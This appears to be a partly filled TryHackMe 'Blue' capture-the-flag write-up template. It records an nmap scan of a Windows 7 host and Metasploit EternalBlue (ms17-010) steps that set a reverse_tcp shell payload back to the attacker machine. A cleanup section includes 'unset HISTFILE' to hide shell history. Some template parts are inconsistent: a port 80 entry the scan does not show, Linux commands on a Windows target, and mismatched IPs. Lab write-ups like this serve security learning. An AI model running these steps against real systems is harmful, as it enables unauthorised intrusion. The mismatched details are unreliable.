# [Blue]

## Basic Info
- **Platform**: TryHackMe
- **IP Address**: 10.10.63.213
- **Date**: 05/03/2025
- **Difficulty**: Easy
- **Tags**: Enumeration, Exploitation, Privilege Escalation

---

## Scanning & Enumeration

### Nmap
**Command:**
```bash
nmap -sVC -T4 -p- --open 10.10.241.158 -oN blue.nmap
```

**Result Summary:**

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-05-02T14:26:05
|_Not valid after:  2025-11-01T14:26:05
|_ssl-date: 2025-05-03T15:50:43+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:50:17:50:99:b1 (unknown)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-03T10:50:37-05:00
| smb2-time: 
|   date: 2025-05-03T15:50:37
|_  start_date: 2025-05-03T14:26:04
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


```

---

## Service Analysis

### Port 80 - HTTP
- **What’s running:** Microsoft Windows RPC
- **Interesting files/directories:** 
- **Vulnerabilities identified:** ms17-010

---

## Exploitation

### Method Used:
- Vulnerability: ms17-010
- Exploit Used: exploit/windows/smb/ms17_010_eternalblue AKA eternalblue
- Shell Access Gained: Yes, reverse shell via Metasploit

**Commands:**
```bash
python3 exploit.py <target>
```
mfsconsole - to start MetaSploit
	set the RHOST to <targetip>
	set the LHOST to <hackermachine>
	set payload windows/x64/shell/reverse_tcp - set the payload to get a reverse shell. 
	show targets - to show potentional targets you can set which varies of the OS that the target has
	set target 1 - to select target os
	run - then run the exploit
---

```bash
CTRL+Z to background the shell
Then ran "search shell_to_meterpreter"
use 0 - to choose the exploit
sessions -l - to list the shells that we have.
set session 1

```

## Post Exploitation

### User Enumeration
```bash
whoami
id
cat /etc/passwd
```

### File Discovery
- User flag location:
- Root flag location:

---

## Privilege Escalation

### Method Used:
- Kernel Exploit / Sudo Misconfig / Cronjob / etc

**Commands:**
```bash
sudo -l
```

---

## Flags

- **User Flag:** 
- **Root Flag:** 

---

## Lessons Learned
- 
- 
- 

---

## Cleanup (If applicable)
```bash
rm /tmp/<filename>
unset HISTFILE
```
